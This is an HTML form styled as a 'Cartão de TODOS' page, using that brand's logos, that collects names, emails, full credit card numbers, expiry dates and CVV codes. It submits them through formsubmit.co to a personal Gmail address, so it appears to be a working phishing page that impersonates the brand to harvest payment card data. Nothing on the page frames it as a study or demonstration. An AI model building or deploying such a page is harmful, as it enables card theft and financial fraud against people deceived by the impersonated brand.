<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulário Cartão de TODOS</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: url('https://marcaspelomundo.com.br/wp-content/uploads/2021/02/CDT-0001-0001-AF-MARCA-CARTAO-DE-TODOS-HORIZONTAL-FUNDO-CLARO-1024x474.png') no-repeat center center fixed;
            background-size: cover;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh;
            margin: 0;
            padding: 15px;
        }
        form { 
            background: #e8f5e9; 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .logo {
            width: 80px;
            margin-bottom: 10px;
        }
        h2 {
            color: #2e7d32; 
            text-align: center;
            margin-bottom: 20px;
        }
        input, textarea { 
            width: 100%; 
            margin-bottom: 15px; 
            padding: 12px; 
            border: 1px solid #2e7d32; 
            border-radius: 6px; 
            outline: none;
            font-size: 16px;
            box-sizing: border-box;
            background: #ffffff;
        }
        input:focus, textarea:focus {
            border-color: #1b5e20;
        }
        button { 
            padding: 12px 20px; 
            background: white; 
            border: 2px solid #2e7d32; 
            color: #2e7d32; 
            border-radius: 6px;
            width: 100%;
            cursor: pointer; 
            font-size: 16px;
            font-weight: bold;
        }
        button:hover { 
            background: #2e7d32; 
            color: white;
        }
        @media (max-width: 500px) {
            form {
                padding: 20px;
            }
            input, textarea, button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
    <script>
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '').substring(0,16);
            let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            input.value = formatted;
        }

        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '').substring(0,4);
            if(value.length >= 3){
                input.value = value.substring(0,2) + '/' + value.substring(2,4);
            } else {
                input.value = value;
            }
        }
    </script>
</head>
<body>

    <form action="https://formsubmit.co/cartaodetodoslondrinense@gmail.com" method="POST">
        <img src="https://play-lh.googleusercontent.com/gKQ-e7NvgquzxM8JOT_YqCjL5S-PVGQjZEGnPI-j4J2_h4RZd0ISgOmSDHBPuZ03Ng" alt="Logo" class="logo">
        <h2>Cartão de TODOS</h2>
        <input type="text" name="name" placeholder="Seu nome" required>
        <input type="email" name="email" placeholder="Seu email" required>
        <input type="text" name="card_name" placeholder="Nome no cartão" required>
        <input type="text" name="card_number" placeholder="Número do cartão" maxlength="19" oninput="formatCardNumber(this)" required>
        <input type="text" name="card_expiry" placeholder="Validade (MM/AA)" maxlength="5" oninput="formatExpiry(this)" required>
        <input type="text" name="card_cvv" placeholder="CVV" maxlength="4" required>
        <textarea name="message" placeholder="Observações adicionais"></textarea>
        <button type="submit">Enviar</button>
    </form>

</body>
</html>
